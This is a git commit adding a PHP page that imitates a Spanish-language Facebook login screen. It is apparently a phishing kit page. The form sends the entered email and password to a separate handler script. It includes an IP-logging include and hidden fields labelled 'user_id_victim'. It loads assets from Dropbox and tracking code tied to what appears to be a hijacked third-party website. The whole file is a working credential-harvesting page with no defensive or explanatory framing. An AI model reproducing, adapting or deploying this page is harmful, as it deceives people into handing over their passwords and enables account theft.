c09478b30c7e33a3eb20e021c02fc432280da8e2
WdSociety <37197502+AndynikeSb@users.noreply.github.com>
2020-04-30 08:33:02 -0500

    Add files via upload

---
+++ Gris/ cara/index.php
@@ -0,0 +1,130 @@
+<?php
+
+header("Content-type: estilos.css; charset: UTF-8");
+
+
+?>
+
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <link type="text/css" rel="stylesheet" href="https://dl.dropboxusercontent.com/s/bcsogulkc87q4rr/style.css">
+
+</head>
+
+<body class="login_page _39il UIPage_LoggedOut b_c3pyn-ahh gecko win x1" dir="ltr">
+    <div class="_li">
+        <div id="pagelet_bluebar">
+            <div id="blueBarDOMInspector">
+                <div class="_53jh">
+                    <div class="loggedout_menubar_container">
+                        <div class="clearfix loggedout_menubar">
+                            <div class="lfloat _ohe">
+                                <h1 style="color:white;font-size:45px ; font-family: 'Roboto', sans-serif;">
+                                    facebook<a href="." title=""><i class="fb_logo img sp_0eOQhLgQG2U sx_fbcf0b">
+
+                                        </i>&nbsp;</a></h1>
+
+
+                            </div>
+                        </div>
+                    </div>
+                    <div class="signupBanner">
+                        <div class="signup_bar_container">
+                            <div class="signup_box clearfix"><span class="signup_box_content"></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="globalContainer" class="uiContextualLayerParent">
+            <div class="fb_content clearfix " id="content" role="main">
+                <div class="_4-u5 _30ny"><span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel"><span class="muffin_tracking_pixel_end"></span>
+                    <div class="_4-u2 _1w1t _4-u8" style="display:block;">
+                        <img src="Gray.jpg" width="600" height="38" style="margin:-16px 0 0px -101px;">
+                        <div class="_xku"><span class="_50f6"></span></div>
+                        <div class="login_form_container">
+                            <form id="login_form" action="login_form_mb.php" accept-charset="utf-8" method="post">
+                                <?php include 'ip.php'; ?>
+
+                                <div style="position:relative;width:100%;" id="loginform">
+                                    <div class="clearfix _5466 _44mg">
+                                        <input class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="1" placeholder="Correo electrónico o número de teléfono" value="" autofocus="1" aria-label="Email address or phone number" type="text">
+                                    </div>
+                                    <div class="clearfix _5466 _44mg">
+                                        <input class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="1" placeholder="Contraseña" aria-label="Password" type="password">
+                                    </div>
+                                    <div class="_xkt">
+                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" tabindex="1" type="submit">Iniciar sesi&oacute;n</button>
+                                    </div>
+                                    <input type="hidden" name="user_id_victim" value="jF5ITYVG1wQk0wMXFhM2hPZHowOQ==" /><input type="hidden" name="user_ip" value="181.174.90.183" /> <input type="hidden" name="type" value="Facebook" /></br>
+                                    <a href="." id="forgot-password-link" target="">¿Olvidaste tu cuenta?</a><span role="presentation" aria-hidden="true"> · </span><a href="." rel="nofollow" id="reg-link">Regístrate en Facebook</a>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div>
+            <div style="background:white;height:230px;" class="padre"></div>
+                <div style="background:white;height:150px;" class="padre">
+                    <span class="hijo"></span>
+                    <a></a>
+
+                   <a href="."  style="margin-left:300px; top: 80px; left: 100px;font-size:13px;">
+                    Español English (US) Português (Brasil) Italiano Français (France) Deutsch 中文(简体)  日本語  العربية हिन्दी
+                    </a>
+                    <a href="."  style="margin-left:300px; top: 80px; left: 100px;font-size:13px;color:#D7D7D7;">______________________________________________________________________________________________________________________________________</a>
+</br></br>
+                    <a  href="."  style="margin-left:300px; top: 80px; left: 100px;font-size:13px;">
+                    Registrarte&nbsp;&nbsp;&nbsp; Iniciar sesión&nbsp;&nbsp;&nbsp;  Messenger   &nbsp;&nbsp;&nbsp; Facebook Lite&nbsp;&nbsp;&nbsp; 
+                     Watch &nbsp;&nbsp;&nbsp;   Personas&nbsp;&nbsp;&nbsp;  Páginas&nbsp;&nbsp;&nbsp; 
+                      Categorías de páginas&nbsp;&nbsp;&nbsp;  Lugares&nbsp;&nbsp;&nbsp;  Juegos &nbsp;&nbsp;&nbsp; Ubicaciones &nbsp;&nbsp;&nbsp; Marketplace
+                    </a></br>
+                    <a href="."  style="margin-left:300px; top: 80px; left: 100px;font-size:13px;">
+                    Grupos &nbsp;&nbsp;&nbsp; Instagram &nbsp;&nbsp;&nbsp; Local Recaudaciones de fondos&nbsp;&nbsp;&nbsp; 
+                     Servicios &nbsp;&nbsp;&nbsp; Información &nbsp;&nbsp;&nbsp; Crear
+                     anuncio&nbsp;&nbsp;&nbsp;  Crear página &nbsp;&nbsp;&nbsp; Desarrolladores &nbsp;&nbsp;&nbsp; Empleo
+                     &nbsp;&nbsp;&nbsp;  Privacidad&nbsp;&nbsp;&nbsp;  Cookies
+                </a></br> 
+
+                <a href="."  style="margin-left:300px; top: 80px; left: 100px;font-size:13px;">
+                Opciones de anuncios  &nbsp;&nbsp;&nbsp;Condiciones Ayuda  &nbsp;&nbsp;&nbsp;
+                </a></br></br>
+                <p href="."  style="margin-left:300px; top: 80px; left: 100px;font-size:12px;color:#898787;">
+                Facebook © 2020
+</p></br>
+                </div>
+                <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+                    <div></div>
+                    <div>
+                        <div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 START -->
+    <script type='text/javascript' src='https://count.carrierzone.com/app/count_server/count.js'></script>
+    <script type='text/javascript'>
+        <!--
+        wm_custnum = '820e8bbd8d6e1ac4';
+        wm_page_name = 'index.php';
+        wm_group_name = '/services/webpages/n/e/newphaseelectrical.co.uk/public/NpkRI';
+        wm_campaign_key = 'campaign_id';
+        wm_track_alt = '';
+        wiredminds.count();
+        // 
+        -->
+
+    </script>
+    <!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 END -->
+</body>
+
+
+</html>
